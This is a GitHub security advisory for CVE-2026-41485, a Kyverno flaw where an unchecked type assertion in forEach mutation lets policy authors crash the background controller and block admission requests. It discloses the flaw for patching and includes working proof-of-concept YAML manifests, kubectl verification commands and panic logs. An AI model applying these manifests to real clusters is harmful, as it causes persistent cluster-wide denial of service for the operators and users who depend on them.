# [H] Kyverno Controller Denial of Service via forEach Mutation Panic

## Summary
Severity: High
Advisory: GHSA-fpjq-c37h-cqcv
CVE: CVE-2026-41485
CWE: CWE-617
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-24
Source: https://github.com/advisories/GHSA-fpjq-c37h-cqcv
Type: github-advisory

## Affected
- Go: `github.com/kyverno/kyverno` — affected >=1.13.0 <1.16.4
- Go: `github.com/kyverno/kyverno` — affected >=1.17.0-rc.1 <1.17.2

## Details
### Summary

An unchecked type assertion in the `forEach` mutation handler allows any user with permission to create a `Policy` or `ClusterPolicy` to crash the cluster-wide background controller into a persistent CrashLoopBackOff. The same bug also causes the admission controller to drop connections and block all matching resource operations. The crash loop persists until the policy is deleted. The vulnerability is confined to the legacy engine, and CEL-based policies are unaffected.

### Details

In `pkg/engine/mutate/mutation.go`, the `ForEach` function performs a bare type assertion on a map value that can be nil:

```go
patcher := NewPatcher(fe["patchStrategicMerge"], fe["patchesJson6902"].(string))
```

When a `forEach` rule uses a `patchesJson6902` field containing a variable substitution (e.g., `{{ element.nonexistent }}`) that resolves to `nil` at runtime, the type assertion `.(string)` on a nil `interface{}` triggers an unrecoverable Go panic:

```
panic: interface conversion: interface {} is nil, not string
```

When a `mutateExisting` rule triggers, the admission controller creates an `UpdateRequest` resource that the background controller processes asynchronously. This resource survives controller restarts, re-triggering the panic on every restart until the policy or `UpdateRequest` is deleted.

The background controller processes `mutateExisting` rules in worker goroutines where `k8s.io/apimachinery/pkg/util/runtime.HandleCrash` catches panics but re-panics by default, killing the process. The admission controller survives because Go's `net/http` server absorbs panics in handler goroutines via  `defer recover()`, though the connection is dropped.

The vulnerable code was introduced in #10702. Kyverno versions v1.13.0 to v1.17.1 are affected.

### PoC

Apply the following manifest:

```yaml
# --- PoC A: Namespaced Policy crashes the background controller ---
apiVersion: kyverno.io/v1
kind: Policy
metadata:
  name: poc-background-crash
  namespace: default
spec:
  mutateExistingOnPolicyUpdate: true
  rules:
  - name: crash-foreach-nil
    match:
      any:
      - resources:
          kinds:
          - ConfigMap
    mutate:
      targets:
      - apiVersion: v1
        kind: ConfigMap
        name: poc-target
        namespace: default
      foreach:
      - list: "target.data | keys(@)"
        patchesJson6902: "{{ element.nonexistent }}"
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: poc-target
  namespace: default
data:
  key1: value1
---
# This ConfigMap creation triggers the mutateExisting rule via UpdateRequest
apiVersion: v1
kind: ConfigMap
metadata:
  name: poc-trigger
  namespace: default
data:
  trigger: "true"
---
# --- PoC B: ClusterPolicy panics the admission controller (connection drop) ---
# Effect: all Secret create/update operations are blocked cluster-wide
# The admission controller does not crash (net/http recovers), but every
# matching request gets EOF -> webhook failure -> denied
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: poc-admission-panic
spec:
  rules:
  - name: panic-foreach-nil
    match:
      any:
      - resources:
          kinds:
          - Secret
    mutate:
      foreach:
      - list: "request.object.data | keys(@)"
        patchesJson6902: "{{ element.nonexistent }}"
```

Verify:

```bash
# After ~5 seconds, background controller is in CrashLoopBackOff:
kubectl get pods -n kyverno -l app.kubernetes.io/component=background-controller

# Admission panic — all Secret operations fail with EOF:
kubectl create secret generic test-secret --from-literal=key=value
# Error: failed calling webhook "mutate.kyverno.svc-fail": ... EOF
```

Admission controller logs:

```
http: panic serving 10.244.0.1:64359: interface conversion: interface {} is nil, not string
goroutine 1914 [running]:
net/http.(*conn).serve.func1()
        net/http/server.go:1943 +0xb4
panic({0x3947fc0?, 0x40023e3890?})
        runtime/panic.go:783 +0x120
github.com/kyverno/kyverno/pkg/engine/mutate.ForEach({0x394e240?, 0x0?}, {{0x4001c3f300, 0x1d}, 0x0, {0x0, 0x0, 0x0}, 0x0, 0x0, ...}, ...)
        github.com/kyverno/kyverno/pkg/engine/mutate/mutation.go:81 +0x3e0
github.com/kyverno/kyverno/pkg/engine/handlers/mutation.(*forEachMutator).mutateElements(0x4002609410, {0x4cd78d8, 0x40023b1d10}, {{0x4001c3f300, 0x1d}, 0x0, {0x0, 0x0, 0x0}, 0x0, ...}, ...)
        github.com/kyverno/kyverno/pkg/engine/handlers/mutation/common.go:126 +0x4e8
github.com/kyverno/kyverno/pkg/engine/handlers/mutation.(*forEachMutator).mutateForEach(0x4002609410, {0x4cd78d8, 0x40023b1d10})
...
```

### Impact

Persistent denial of service of cluster-wide Kyverno controllers. `Policy` is a namespaced resource whose creation can be delegated to namespace users via standard Role/RoleBinding, without granting any cluster-level permissions. Such a user can:

1. Crash the background controller into a persistent CrashLoopBackOff, halting all background processing (generate rules, mutateExisting rules, cleanup) across all namespaces in the cluster, not just their own.
2. Block admission operations for matched resource kinds within their namespace via the admission controller webhook panic path. With a `ClusterPolicy` (requiring cluster-level RBAC), the admission block extends cluster-wide.

The crash loop is self-sustaining because the poisoned `UpdateRequest` remains in the queue and re-triggers the panic on every controller restart.

## References
- https://github.com/kyverno/kyverno/security/advisories/GHSA-fpjq-c37h-cqcv
- https://nvd.nist.gov/vuln/detail/CVE-2026-41485
- https://github.com/kyverno/kyverno/commit/76c8fdbe87328722e099e1fd44c3f21c9f7809cb
- https://github.com/kyverno/kyverno/commit/80e728c2283a0c65e5adb02d8a907106e6ebe7e3
- https://github.com/kyverno/kyverno
